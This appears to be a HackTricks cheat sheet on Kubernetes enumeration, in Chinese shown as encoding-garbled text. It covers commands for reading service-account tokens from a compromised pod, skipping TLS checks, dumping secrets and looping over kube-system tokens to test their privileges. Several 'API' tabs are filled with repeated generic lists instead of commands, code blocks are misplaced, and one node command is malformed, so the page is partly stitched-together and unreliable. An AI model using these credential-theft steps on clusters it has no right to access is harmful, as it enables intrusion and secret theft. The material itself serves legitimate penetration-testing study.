# Kubernetesæšä¸¾

{% hint style="success" %}
å­¦ä¹ å¹¶ç»ƒä¹ AWS Hackingï¼š<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricksåŸ¹è®­AWSçº¢é˜Ÿä¸“å®¶ï¼ˆARTEï¼‰**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
å­¦ä¹ å¹¶ç»ƒä¹ GCP Hackingï¼š<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricksåŸ¹è®­GCPçº¢é˜Ÿä¸“å®¶ï¼ˆGRTEï¼‰**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒHackTricks</summary>

* æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨**æˆ‘ä»¬çš„**Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* é€šè¿‡å‘[**HackTricks**](https://github.com/carlospolop/hacktricks)å’Œ[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRæ¥åˆ†äº«é»‘å®¢æŠ€å·§ã€‚

</details>
{% endhint %}

## Kubernetesä»¤ç‰Œ

å¦‚æœæ‚¨å·²ç»ç ´åäº†å¯¹æŸå°æœºå™¨çš„è®¿é—®æƒé™ï¼Œç”¨æˆ·å¯èƒ½å¯ä»¥è®¿é—®æŸäº›Kuberneteså¹³å°ã€‚ä»¤ç‰Œé€šå¸¸ä½äºç”±**ç¯å¢ƒå˜é‡`KUBECONFIG`**æŒ‡å‘çš„æ–‡ä»¶ä¸­ï¼Œæˆ–è€…**åœ¨`~/.kube`**ä¸­ã€‚

åœ¨è¿™ä¸ªæ–‡ä»¶å¤¹ä¸­ï¼Œæ‚¨å¯èƒ½ä¼šæ‰¾åˆ°åŒ…å«**è¿æ¥åˆ°APIæœåŠ¡å™¨çš„ä»¤ç‰Œå’Œé…ç½®**çš„é…ç½®æ–‡ä»¶ã€‚åœ¨è¿™ä¸ªæ–‡ä»¶å¤¹ä¸­ï¼Œæ‚¨è¿˜å¯ä»¥æ‰¾åˆ°ä¸€ä¸ªåŒ…å«å…ˆå‰æ£€ç´¢ä¿¡æ¯çš„ç¼“å­˜æ–‡ä»¶å¤¹ã€‚

å¦‚æœæ‚¨å·²ç»ç ´åäº†Kubernetesç¯å¢ƒä¸­çš„ä¸€ä¸ªpodï¼Œè¿˜æœ‰å…¶ä»–åœ°æ–¹å¯ä»¥æ‰¾åˆ°ä»¤ç‰Œå’Œæœ‰å…³å½“å‰K8ç¯å¢ƒçš„ä¿¡æ¯ï¼š

### æœåŠ¡è´¦æˆ·ä»¤ç‰Œ

åœ¨ç»§ç»­ä¹‹å‰ï¼Œå¦‚æœæ‚¨ä¸çŸ¥é“Kubernetesä¸­çš„æœåŠ¡æ˜¯ä»€ä¹ˆï¼Œæˆ‘å»ºè®®æ‚¨**è·Ÿéšæ­¤é“¾æ¥å¹¶è‡³å°‘é˜…è¯»æœ‰å…³Kubernetesæ¶æ„çš„ä¿¡æ¯**ã€‚

æ¥è‡ªKubernetes[æ–‡æ¡£](https://kubernetes.io/docs/tasks/configure-pod-container/configure-service-account/#use-the-default-service-account-to-access-the-api-server)ï¼š

_â€œå½“æ‚¨åˆ›å»ºä¸€ä¸ªpodæ—¶ï¼Œå¦‚æœæ‚¨æ²¡æœ‰æŒ‡å®šæœåŠ¡è´¦æˆ·ï¼Œå®ƒå°†è‡ªåŠ¨åˆ†é…ç»™_é»˜è®¤_å‘½åç©ºé—´ä¸­çš„é»˜è®¤_æœåŠ¡è´¦æˆ·ã€‚â€_

**ServiceAccount**æ˜¯ç”±Kubernetesç®¡ç†çš„å¯¹è±¡ï¼Œç”¨äºä¸ºåœ¨podä¸­è¿è¡Œçš„è¿›ç¨‹æä¾›èº«ä»½ã€‚\
æ¯ä¸ªæœåŠ¡è´¦æˆ·éƒ½æœ‰ä¸€ä¸ªä¸ä¹‹ç›¸å…³çš„ç§˜å¯†ï¼Œè¯¥ç§˜å¯†åŒ…å«ä¸€ä¸ªæŒæœ‰è€…ä»¤ç‰Œã€‚è¿™æ˜¯ä¸€ä¸ªJSON Webä»¤ç‰Œï¼ˆJWTï¼‰ï¼Œç”¨äºåœ¨ä¸¤ä¸ªæ–¹ä¹‹é—´å®‰å…¨åœ°è¡¨ç¤ºå£°æ˜çš„æ–¹æ³•ã€‚

é€šå¸¸**ä¸€ä¸ª**ç›®å½•ï¼š

* `/run/secrets/kubernetes.io/serviceaccount`
* `/var/run/secrets/kubernetes.io/serviceaccount`
* `/secrets/kubernetes.io/serviceaccount`

åŒ…å«ä»¥ä¸‹æ–‡ä»¶ï¼š

* **ca.crt**ï¼šç”¨äºæ£€æŸ¥Kubernetesé€šä¿¡çš„caè¯ä¹¦
* **namespace**ï¼šæŒ‡ç¤ºå½“å‰å‘½åç©ºé—´
* **token**ï¼šåŒ…å«å½“å‰podçš„**æœåŠ¡ä»¤ç‰Œ**ã€‚

ç°åœ¨æ‚¨æœ‰äº†ä»¤ç‰Œï¼Œæ‚¨å¯ä»¥åœ¨ç¯å¢ƒå˜é‡**`KUBECONFIG`**ä¸­æ‰¾åˆ°APIæœåŠ¡å™¨ã€‚è¦è·å–æ›´å¤šä¿¡æ¯ï¼Œè¯·è¿è¡Œ`(env | set) | grep -i "kuber|kube`**`"`**

æœåŠ¡è´¦æˆ·ä»¤ç‰Œç”±æ–‡ä»¶**sa.key**ä¸­çš„å¯†é’¥ç­¾åï¼Œå¹¶ç”±**sa.pub**éªŒè¯ã€‚

**Kubernetes**ä¸Šçš„é»˜è®¤ä½ç½®ï¼š

* /etc/kubernetes/pki

**Minikube**ä¸Šçš„é»˜è®¤ä½ç½®ï¼š

* /var/lib/localkube/certs

### çƒ­ç‚¹Pods

_**çƒ­ç‚¹Pods**_æ˜¯åŒ…å«ç‰¹æƒæœåŠ¡è´¦æˆ·ä»¤ç‰Œçš„Podsã€‚ç‰¹æƒæœåŠ¡è´¦æˆ·ä»¤ç‰Œæ˜¯å…·æœ‰æ‰§è¡Œç‰¹æƒä»»åŠ¡æƒé™çš„ä»¤ç‰Œï¼Œä¾‹å¦‚åˆ—å‡ºç§˜å¯†ã€åˆ›å»ºPodç­‰ã€‚

## RBAC

å¦‚æœæ‚¨ä¸çŸ¥é“**RBAC**æ˜¯ä»€ä¹ˆï¼Œè¯·**é˜…è¯»æœ¬èŠ‚**ã€‚

## æšä¸¾é€ŸæŸ¥è¡¨

ä¸ºäº†æšä¸¾K8sç¯å¢ƒï¼Œæ‚¨éœ€è¦ä»¥ä¸‹å‡ ç‚¹ï¼š

* ä¸€ä¸ª**æœ‰æ•ˆçš„èº«ä»½éªŒè¯ä»¤ç‰Œ**ã€‚åœ¨å‰ä¸€èŠ‚ä¸­ï¼Œæˆ‘ä»¬çœ‹åˆ°äº†åœ¨å“ªé‡Œæœç´¢ç”¨æˆ·ä»¤ç‰Œå’ŒæœåŠ¡è´¦æˆ·ä»¤ç‰Œã€‚
* Kubernetes APIçš„**åœ°å€ï¼ˆ_**https://host:port**_**ï¼‰**ã€‚è¿™é€šå¸¸å¯ä»¥åœ¨ç¯å¢ƒå˜é‡å’Œ/æˆ–kubeé…ç½®æ–‡ä»¶ä¸­æ‰¾åˆ°ã€‚
* **å¯é€‰é¡¹**ï¼š**ca.crtç”¨äºéªŒè¯APIæœåŠ¡å™¨**ã€‚è¿™å¯ä»¥åœ¨æ‰¾åˆ°ä»¤ç‰Œçš„åœ°æ–¹æ‰¾åˆ°ã€‚è¿™å¯¹äºéªŒè¯APIæœåŠ¡å™¨è¯ä¹¦å¾ˆæœ‰ç”¨ï¼Œä½†ä½¿ç”¨`kubectl`çš„`--insecure-skip-tls-verify`æˆ–`curl`çš„`-k`ï¼Œæ‚¨å°†ä¸éœ€è¦æ­¤æ–‡ä»¶ã€‚

æœ‰äº†è¿™äº›ç»†èŠ‚ï¼Œæ‚¨å°±å¯ä»¥**æšä¸¾Kubernetes**ã€‚å¦‚æœç”±äºæŸç§åŸå› **API**å¯ä»¥é€šè¿‡**äº’è”ç½‘è®¿é—®**ï¼Œæ‚¨å¯ä»¥ç›´æ¥ä»æ‚¨çš„ä¸»æœºä¸‹è½½è¯¥ä¿¡æ¯å¹¶æšä¸¾å¹³å°ã€‚

ç„¶è€Œï¼Œé€šå¸¸**APIæœåŠ¡å™¨ä½äºå†…éƒ¨ç½‘ç»œä¸­**ï¼Œå› æ­¤æ‚¨éœ€è¦é€šè¿‡å—æŸçš„æœºå™¨åˆ›å»ºä¸€ä¸ªéš§é“ä»¥ä»æ‚¨çš„æœºå™¨è®¿é—®å®ƒï¼Œæˆ–è€…æ‚¨å¯ä»¥**ä¸Šä¼ **[**kubectl**](https://kubernetes.io/docs/tasks/tools/install-kubectl-linux/#install-kubectl-binary-with-curl-on-linux)äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œæˆ–ä½¿ç”¨**`curl/wget/anything`**æ‰§è¡ŒåŸå§‹HTTPè¯·æ±‚åˆ°APIæœåŠ¡å™¨ã€‚

### `list`å’Œ`get`åŠ¨è¯ä¹‹é—´çš„åŒºåˆ«

ä½¿ç”¨**`get`**æƒé™ï¼Œæ‚¨å¯ä»¥è®¿é—®ç‰¹å®šèµ„äº§çš„ä¿¡æ¯ï¼ˆ`kubectl`ä¸­çš„`describe`é€‰é¡¹ï¼‰ã€‚
```
GET /apis/apps/v1/namespaces/{namespace}/deployments/{name}
```
å¦‚æœæ‚¨æ‹¥æœ‰**`list`**æƒé™ï¼Œåˆ™å…è®¸æ‚¨æ‰§è¡ŒAPIè¯·æ±‚æ¥åˆ—å‡ºæŸç§ç±»å‹çš„èµ„äº§ï¼ˆ_`kubectl`_ä¸­çš„`get`é€‰é¡¹ï¼‰ï¼š
```bash
#In a namespace
GET /apis/apps/v1/namespaces/{namespace}/deployments
#In all namespaces
GET /apis/apps/v1/deployments
```
å¦‚æœæ‚¨æ‹¥æœ‰**`watch`**æƒé™ï¼Œæ‚¨å¯ä»¥æ‰§è¡ŒAPIè¯·æ±‚æ¥ç›‘è§†èµ„äº§ï¼š
```
GET /apis/apps/v1/deployments?watch=true
GET /apis/apps/v1/watch/namespaces/{namespace}/deployments?watch=true
GET /apis/apps/v1/watch/namespaces/{namespace}/deployments/{name}  [DEPRECATED]
GET /apis/apps/v1/watch/namespaces/{namespace}/deployments  [DEPRECATED]
GET /apis/apps/v1/watch/deployments  [DEPRECATED]
```
ä»–ä»¬æ‰“å¼€äº†ä¸€ä¸ªæµè¿æ¥ï¼Œæ¯å½“ Deployment å‘ç”Ÿå˜åŒ–ï¼ˆæˆ–åˆ›å»ºæ–°çš„ Deployment æ—¶ï¼‰ï¼Œå°±ä¼šè¿”å›å®Œæ•´çš„æ¸…å•ã€‚

{% hint style="danger" %}
ä»¥ä¸‹ `kubectl` å‘½ä»¤ä»…æŒ‡ç¤ºå¦‚ä½•åˆ—å‡ºå¯¹è±¡ã€‚å¦‚æœè¦è®¿é—®æ•°æ®ï¼Œéœ€è¦ä½¿ç”¨ `describe` è€Œä¸æ˜¯ `get`ã€‚
{% endhint %}

### ä½¿ç”¨ curl

ä» Pod å†…éƒ¨ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨å¤šä¸ªç¯å¢ƒå˜é‡ï¼š
```bash
export APISERVER=${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT_HTTPS}
export SERVICEACCOUNT=/var/run/secrets/kubernetes.io/serviceaccount
export NAMESPACE=$(cat ${SERVICEACCOUNT}/namespace)
export TOKEN=$(cat ${SERVICEACCOUNT}/token)
export CACERT=${SERVICEACCOUNT}/ca.crt
alias kurl="curl --cacert ${CACERT} --header \"Authorization: Bearer ${TOKEN}\""
# if kurl is still got cert Error, using -k option to solve this.
```
{% hint style="warning" %}
é»˜è®¤æƒ…å†µä¸‹ï¼Œpod å¯ä»¥è®¿é—®åŸŸå `kubernetes.default.svc` ä¸­çš„ kube-api æœåŠ¡å™¨ï¼Œå¹¶ä¸”æ‚¨å¯ä»¥åœ¨ `/etc/resolv.config` ä¸­çœ‹åˆ° kube ç½‘ç»œï¼Œå› ä¸ºæ‚¨å°†æ‰¾åˆ° kubernetes DNS æœåŠ¡å™¨çš„åœ°å€ï¼ˆåŒä¸€èŒƒå›´çš„ ".1" æ˜¯ kube-api ç»ˆç«¯ç‚¹ï¼‰ã€‚
{% endhint %}

### ä½¿ç”¨ kubectl

æ‹¥æœ‰ä»¤ç‰Œå’Œ API æœåŠ¡å™¨çš„åœ°å€åï¼Œæ‚¨å¯ä»¥ä½¿ç”¨ kubectl æˆ– curl è®¿é—®å®ƒï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š

é»˜è®¤æƒ…å†µä¸‹ï¼ŒAPISERVER ä½¿ç”¨ `https://` æ¨¡å¼é€šä¿¡
```bash
alias k='kubectl --token=$TOKEN --server=https://$APISERVER --insecure-skip-tls-verify=true'
```
> å¦‚æœ URL ä¸­æ²¡æœ‰ `https://`ï¼Œå¯èƒ½ä¼šæ”¶åˆ°ç±»ä¼¼ Bad Request çš„é”™è¯¯ã€‚

æ‚¨å¯ä»¥åœ¨[**è¿™é‡Œæ‰¾åˆ°å®˜æ–¹ kubectl æŠ€å·§è¡¨**](https://kubernetes.io/docs/reference/kubectl/cheatsheet/)ã€‚ä»¥ä¸‹å„èŠ‚çš„ç›®æ ‡æ˜¯ä»¥æœ‰åºæ–¹å¼å‘ˆç°ä¸åŒçš„é€‰é¡¹ï¼Œä»¥æšä¸¾å’Œäº†è§£æ‚¨å·²ç»è®¿é—®çš„æ–° K8sã€‚

è¦æŸ¥æ‰¾ `kubectl` å‘é€çš„ HTTP è¯·æ±‚ï¼Œå¯ä»¥ä½¿ç”¨å‚æ•° `-v=8`

#### MitM kubectl - ä»£ç†åŒ– kubectl
```bash
# Launch burp
# Set proxy
export HTTP_PROXY=http://localhost:8080
export HTTPS_PROXY=http://localhost:8080
# Launch kubectl
kubectl get namespace --insecure-skip-tls-verify=true
```
### å½“å‰é…ç½®

{% tabs %}
{% tab title="Kubectl" %}
```bash
kubectl config get-users
kubectl config get-contexts
kubectl config get-clusters
kubectl config current-context

# Change namespace
kubectl config set-context --current --namespace=<namespace>
```
{% endtab %}
{% endtabs %}

å¦‚æœæ‚¨æˆåŠŸçªƒå–äº†ä¸€äº›ç”¨æˆ·å‡­æ®ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨ç±»ä¼¼ä»¥ä¸‹æ–¹å¼**åœ¨æœ¬åœ°é…ç½®**ï¼š
```bash
kubectl config set-credentials USER_NAME \
--auth-provider=oidc \
--auth-provider-arg=idp-issuer-url=( issuer url ) \
--auth-provider-arg=client-id=( your client id ) \
--auth-provider-arg=client-secret=( your client secret ) \
--auth-provider-arg=refresh-token=( your refresh token ) \
--auth-provider-arg=idp-certificate-authority=( path to your ca certificate ) \
--auth-provider-arg=id-token=( your id_token )
```
### è·å–æ”¯æŒçš„èµ„æº

é€šè¿‡è¿™äº›ä¿¡æ¯ï¼Œæ‚¨å°†äº†è§£å¯ä»¥åˆ—å‡ºçš„æ‰€æœ‰æœåŠ¡

{% tabs %}
{% tab title="kubectl" %}
```bash
k api-resources --namespaced=true #Resources specific to a namespace
k api-resources --namespaced=false #Resources NOT specific to a namespace
```
### è·å–å½“å‰æƒé™

{% tabs %}
{% tab title="kubectl" %}
```bash
k auth can-i --list #Get privileges in general
k auth can-i --list -n custnamespace #Get privileves in custnamespace

# Get service account permissions
k auth can-i --list --as=system:serviceaccount:<namespace>:<sa_name> -n <namespace>
```
{% endtab %}

{% tab title="API" %} 

## Kubernetes API æšä¸¾

åœ¨è¿›è¡Œ Kubernetes æ¸—é€æµ‹è¯•æ—¶ï¼Œæšä¸¾ Kubernetes API æ˜¯éå¸¸é‡è¦çš„ä¸€æ­¥ã€‚ä»¥ä¸‹æ˜¯ä¸€äº›å¸¸è§çš„æ–¹æ³•ï¼š

### 1. **è®¿é—® Kubernetes API æœåŠ¡å™¨**

æ‚¨å¯ä»¥ä½¿ç”¨ `kubectl` å‘½ä»¤è¡Œå·¥å…·æˆ–ç›´æ¥é€šè¿‡ HTTP è®¿é—® Kubernetes API æœåŠ¡å™¨ã€‚ç¡®ä¿æ‚¨æ‹¥æœ‰è¶³å¤Ÿçš„æƒé™æ¥æ‰§è¡Œæ­¤æ“ä½œã€‚

### 2. **ä½¿ç”¨ `kubectl` å‘½ä»¤**

ä½¿ç”¨ `kubectl` å‘½ä»¤å¯ä»¥åˆ—å‡ºé›†ç¾¤ä¸­çš„èµ„æºï¼Œä¾‹å¦‚ `kubectl get pods`ã€`kubectl get nodes` ç­‰ã€‚

### 3. **è®¿é—® API ç«¯ç‚¹**

å°è¯•è®¿é—® Kubernetes API ç«¯ç‚¹ï¼Œä¾‹å¦‚ `https://<cluster-ip>/api` æˆ– `https://<cluster-ip>/api/v1`.

### 4. **ä½¿ç”¨ Kubernetes Dashboard**

å¦‚æœé›†ç¾¤ä¸­å®‰è£…äº† Kubernetes Dashboardï¼Œæ‚¨å¯ä»¥å°è¯•è®¿é—®è¯¥ä»ªè¡¨æ¿å¹¶æŸ¥çœ‹ç›¸å…³ä¿¡æ¯ã€‚

### 5. **æ‰«æå·¥å…·**

ä½¿ç”¨ä¸“é—¨çš„æ‰«æå·¥å…·ï¼Œå¦‚ kube-hunterï¼Œæ¥å¸®åŠ©å‘ç°æ½œåœ¨çš„å®‰å…¨é—®é¢˜ã€‚

### 6. **æŸ¥æ‰¾æœªç»æˆæƒçš„ç«¯ç‚¹**

æœç´¢é›†ç¾¤ä¸­å¯èƒ½å­˜åœ¨çš„æœªç»æˆæƒçš„ API ç«¯ç‚¹ï¼Œè¿™å¯èƒ½ä¼šå¯¼è‡´å®‰å…¨é£é™©ã€‚

### 7. **å®¡æŸ¥ RBAC é…ç½®**

å®¡æŸ¥ Role-Based Access Control (RBAC) é…ç½®ï¼Œç¡®ä¿åªæœ‰æˆæƒçš„ç”¨æˆ·å¯ä»¥è®¿é—®ç‰¹å®šèµ„æºã€‚

### 8. **ç›‘æ§ API æ´»åŠ¨**

ç›‘æ§ Kubernetes API çš„æ´»åŠ¨ï¼ŒåŠæ—¶å‘ç°å¼‚å¸¸è¡Œä¸ºã€‚

### 9. **æŸ¥æ‰¾æ•æ„Ÿä¿¡æ¯**

æ£€æŸ¥ API å“åº”ä¸­æ˜¯å¦åŒ…å«æ•æ„Ÿä¿¡æ¯ï¼Œå¦‚å¯†ç ã€å¯†é’¥ç­‰ã€‚

### 10. **å®¡æŸ¥æ—¥å¿—**

å®¡æŸ¥ Kubernetes API æœåŠ¡å™¨çš„æ—¥å¿—ï¼Œä»¥äº†è§£è°è®¿é—®äº† API ä»¥åŠæ‰§è¡Œäº†ä»€ä¹ˆæ“ä½œã€‚

é€šè¿‡è¿™äº›æ–¹æ³•ï¼Œæ‚¨å¯ä»¥æ›´å¥½åœ°äº†è§£ Kubernetes é›†ç¾¤çš„å®‰å…¨æ€§ï¼Œå¹¶å‘ç°æ½œåœ¨çš„å®‰å…¨é£é™©ã€‚

{% endtab %}
```bash
kurl -i -s -k -X $'POST' \
-H $'Content-Type: application/json' \
--data-binary $'{\"kind\":\"SelfSubjectRulesReview\",\"apiVersion\":\"authorization.k8s.io/v1\",\"metadata\":{\"creationTimestamp\":null},\"spec\":{\"namespace\":\"default\"},\"status\":{\"resourceRules\":null,\"nonResourceRules\":null,\"incomplete\":false}}\x0a' \
"https://$APISERVER/apis/authorization.k8s.io/v1/selfsubjectrulesreviews"
```
{% endtab %}
{% endtabs %}

å¦ä¸€ç§æ£€æŸ¥æ‚¨æƒé™çš„æ–¹æ³•æ˜¯ä½¿ç”¨å·¥å…·ï¼š[**https://github.com/corneliusweig/rakkess**](https://github.com/corneliusweig/rakkess)****

æ‚¨å¯ä»¥åœ¨ä»¥ä¸‹äº†è§£æ›´å¤šå…³äº**Kubernetes RBAC**çš„ä¿¡æ¯ï¼š

{% content-ref url="kubernetes-role-based-access-control-rbac.md" %}
[kubernetes-role-based-access-control-rbac.md](kubernetes-role-based-access-control-rbac.md)
{% endcontent-ref %}

**ä¸€æ—¦æ‚¨çŸ¥é“æ‚¨æ‹¥æœ‰çš„æƒé™**ï¼Œè¯·æŸ¥çœ‹ä»¥ä¸‹é¡µé¢ä»¥ç¡®å®š**æ˜¯å¦å¯ä»¥æ»¥ç”¨å®ƒä»¬**ä»¥æå‡æƒé™ï¼š

{% content-ref url="abusing-roles-clusterroles-in-kubernetes/" %}
[abusing-roles-clusterroles-in-kubernetes](abusing-roles-clusterroles-in-kubernetes/)
{% endcontent-ref %}

### è·å–å…¶ä»–è§’è‰²

{% tabs %}
{% tab title="kubectl" %}
```bash
k get roles
k get clusterroles
```
{% endtab %}

{% tab title="API" %} 

## Kubernetes API æšä¸¾

åœ¨è¿›è¡Œ Kubernetes æ¸—é€æµ‹è¯•æ—¶ï¼Œæšä¸¾ Kubernetes API æ˜¯éå¸¸é‡è¦çš„ä¸€æ­¥ã€‚ä»¥ä¸‹æ˜¯ä¸€äº›å¸¸è§çš„æ–¹æ³•ï¼š

### 1. **è®¿é—® Kubernetes API æœåŠ¡å™¨**

æ‚¨å¯ä»¥ä½¿ç”¨ `kubectl` å‘½ä»¤è¡Œå·¥å…·æˆ–ç›´æ¥é€šè¿‡ HTTP è®¿é—® Kubernetes API æœåŠ¡å™¨ã€‚ç¡®ä¿æ‚¨æ‹¥æœ‰è¶³å¤Ÿçš„æƒé™æ¥æ‰§è¡Œæ­¤æ“ä½œã€‚

### 2. **ä½¿ç”¨ `kubectl` å‘½ä»¤**

ä½¿ç”¨ `kubectl` å‘½ä»¤å¯ä»¥åˆ—å‡ºé›†ç¾¤ä¸­çš„æ‰€æœ‰èµ„æºï¼Œä¾‹å¦‚ `kubectl get pods`ã€`kubectl get nodes` ç­‰ã€‚

### 3. **è®¿é—® API ç«¯ç‚¹**

å°è¯•è®¿é—®ä»¥ä¸‹å¸¸è§çš„ API ç«¯ç‚¹ï¼š

- `/api`
- `/api/v1`
- `/apis`
- `/apis/apps`
- `/apis/extensions`

### 4. **ä½¿ç”¨ Kubernetes API å®¢æˆ·ç«¯**

æ‚¨å¯ä»¥ä½¿ç”¨åƒ `Postman` æˆ– `curl` è¿™æ ·çš„å·¥å…·æ¥ä¸ Kubernetes API è¿›è¡Œäº¤äº’ï¼Œä»è€Œæšä¸¾é›†ç¾¤ä¸­çš„èµ„æºå’Œé…ç½®ã€‚

### 5. **æŸ¥æ‰¾æœªç»æˆæƒçš„ API è®¿é—®**

ç¡®ä¿æ²¡æœ‰æœªç»æˆæƒçš„ API è®¿é—®ï¼Œä»¥é˜²æ­¢æ¶æ„ç”¨æˆ·åˆ©ç”¨è¿™äº›æ¼æ´ã€‚

### 6. **æ£€æŸ¥ RBAC é…ç½®**

æŸ¥çœ‹é›†ç¾¤ä¸­çš„ Role-Based Access Control (RBAC) é…ç½®ï¼Œç¡®ä¿åªæœ‰æˆæƒç”¨æˆ·å¯ä»¥è®¿é—®ç‰¹å®šçš„ APIã€‚

### 7. **å®¡æŸ¥ Service Account æƒé™**

æ£€æŸ¥ Service Account çš„æƒé™ï¼Œç¡®ä¿å®ƒä»¬è¢«æ­£ç¡®é…ç½®ä»¥é™åˆ¶å¯¹ API çš„è®¿é—®ã€‚

### 8. **ç›‘è§† API æ´»åŠ¨**

å®šæœŸç›‘è§† Kubernetes API çš„æ´»åŠ¨ï¼Œä»¥ä¾¿åŠæ—¶å‘ç°ä»»ä½•å¼‚å¸¸è¡Œä¸ºã€‚

é€šè¿‡è¿™äº›æ–¹æ³•ï¼Œæ‚¨å¯ä»¥æ›´å¥½åœ°äº†è§£ Kubernetes é›†ç¾¤ä¸­çš„ APIï¼Œå¹¶ç¡®ä¿å…¶å®‰å…¨æ€§ã€‚

{% endtab %}
```bash
kurl -k -v "https://$APISERVER/apis/authorization.k8s.io/v1/namespaces/eevee/roles?limit=500"
kurl -k -v "https://$APISERVER/apis/authorization.k8s.io/v1/namespaces/eevee/clusterroles?limit=500"
```
### è·å–å‘½åç©ºé—´

Kubernetesæ”¯æŒç”±åŒä¸€ç‰©ç†é›†ç¾¤æ”¯æŒçš„**å¤šä¸ªè™šæ‹Ÿé›†ç¾¤**ã€‚è¿™äº›è™šæ‹Ÿé›†ç¾¤è¢«ç§°ä¸º**å‘½åç©ºé—´**ã€‚
```bash
k get namespaces
```
{% endtab %}

{% tab title="API" %} 

## Kubernetes API æšä¸¾

åœ¨è¿›è¡Œ Kubernetes æ¸—é€æµ‹è¯•æ—¶ï¼Œæšä¸¾ Kubernetes API æ˜¯éå¸¸é‡è¦çš„ä¸€æ­¥ã€‚ä»¥ä¸‹æ˜¯ä¸€äº›å¸¸è§çš„æ–¹æ³•ï¼š

1. **è®¿é—® kube-apiserver**ï¼šå°è¯•è®¿é—® kube-apiserverï¼Œé€šå¸¸åœ¨ `https://<cluster-ip>:6443` ä¸Šç›‘å¬ã€‚

2. **ä½¿ç”¨ kubectl**ï¼šä½¿ç”¨ kubectl å‘½ä»¤è¡Œå·¥å…·ä¸ API è¿›è¡Œäº¤äº’ï¼Œä¾‹å¦‚ `kubectl get pods`ã€‚

3. **è®¿é—® API èµ„æº**ï¼šæšä¸¾ä¸åŒçš„ API èµ„æºï¼Œå¦‚ podsã€deploymentsã€services ç­‰ã€‚

4. **æŸ¥çœ‹ API ç‰ˆæœ¬**ï¼šç¡®å®š Kubernetes API çš„ç‰ˆæœ¬ï¼Œå¯èƒ½ä¼šå½±å“å¯ç”¨çš„åŠŸèƒ½å’Œæ¼æ´ã€‚

5. **æ£€æŸ¥ RBAC é…ç½®**ï¼šæŸ¥çœ‹è§’è‰²åŸºäºè®¿é—®æ§åˆ¶ï¼ˆRBACï¼‰é…ç½®ï¼Œäº†è§£å“ªäº›æƒé™è¢«æˆäºˆç»™äº†å½“å‰ç”¨æˆ·ã€‚

6. **æ‰«ææœªç»æˆæƒçš„ç«¯ç‚¹**ï¼šæ‰«æé›†ç¾¤ä¸­çš„æœªç»æˆæƒçš„ API ç«¯ç‚¹ï¼Œå¯èƒ½ä¼šå‘ç°å®‰å…¨é—®é¢˜ã€‚

7. **ä½¿ç”¨å·¥å…·**ï¼šä½¿ç”¨ä¸“é—¨çš„å·¥å…·å¦‚ kube-hunter è¿›è¡Œè‡ªåŠ¨åŒ–çš„ API æšä¸—ã€‚

è®°ä½ï¼Œåœ¨è¿›è¡Œ Kubernetes API æšä¸¾æ—¶è¦æ ¼å¤–å°å¿ƒï¼Œé¿å…å¯¹ç”Ÿäº§ç¯å¢ƒé€ æˆå½±å“ã€‚

{% endtab %}
```bash
kurl -k -v https://$APISERVER/api/v1/namespaces/
```
### è·å–ç§˜å¯†ä¿¡æ¯

{% tabs %}
{% tab title="kubectl" %}
```
k get secrets -o yaml
k get secrets -o yaml -n custnamespace
```
{% endtab %}

{% tab title="API" %} 

### Kubernetes Enumeration

#### Service Accounts

Service accounts can be used to interact with the Kubernetes API. Enumerate service accounts to identify potential targets for privilege escalation.

- **List Service Accounts:**
  ```bash
  kubectl get serviceaccounts --all-namespaces
  ```

- **Describe Service Account:**
  ```bash
  kubectl describe serviceaccount <service-account-name> -n <namespace>
  ```

- **List Service Account Tokens:**
  ```bash
  kubectl get secrets --namespace <namespace> | grep <service-account-name>
  ```

- **Decode Service Account Token:**
  ```bash
  kubectl get secret <service-account-token> -n <namespace> -o json | jq -r .data.token | base64 -d
  ```

#### Pods

Pods are the smallest deployable units in Kubernetes. Enumerate pods to discover running applications and potential vulnerabilities.

- **List Pods:**
  ```bash
  kubectl get pods --all-namespaces
  ```

- **Describe Pod:**
  ```bash
  kubectl describe pod <pod-name> -n <namespace>
  ```

- **Access Pod Shell:**
  ```bash
  kubectl exec -it <pod-name> -n <namespace> -- /bin/sh
  ```

#### Nodes

Nodes are the worker machines in a Kubernetes cluster. Enumerate nodes to gather information about the cluster infrastructure.

- **List Nodes:**
  ```bash
  kubectl get nodes
  ```

- **Describe Node:**
  ```bash
  kjson -o jsonpath='{.status.addresses[?(@.type=="ExternalIP")].address}' | head -n 1
  ```

- **Access Node Shell:**
  ```bash
  ssh <node-external-ip>
  ```

#### RBAC

Role-Based Access Control (RBAC) defines access policies for Kubernetes resources. Enumerate RBAC roles and role bindings to identify potential misconfigurations.

- **List Roles:**
  ```bash
  kubectl get roles --all-namespaces
  ```

- **List Role Bindings:**
  ```bash
  kubectl get rolebindings --all-namespaces
  ```

- **Describe Role:**
  ```bash
  kubectl describe role <role-name> -n <namespace>
  ```

- **Describe Role Binding:**
  ```bash
  kubectl describe rolebinding <role-binding-name> -n <namespace>
  ```

</details>
{% endtab %}
```
```bash
kurl -v https://$APISERVER/api/v1/namespaces/default/secrets/

kurl -v https://$APISERVER/api/v1/namespaces/custnamespace/secrets/
```
{% endtab %}
{% endtabs %}

å¦‚æœæ‚¨å¯ä»¥è¯»å–ç§˜å¯†ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨ä»¥ä¸‹è¡Œæ¥è·å–ä¸æ¯ä¸ªä»¤ç‰Œç›¸å…³çš„ç‰¹æƒï¼š
```bash
for token in `k describe secrets -n kube-system | grep "token:" | cut -d " " -f 7`; do echo $token; k --token $token auth can-i --list; echo; done
```
### è·å–æœåŠ¡è´¦æˆ·

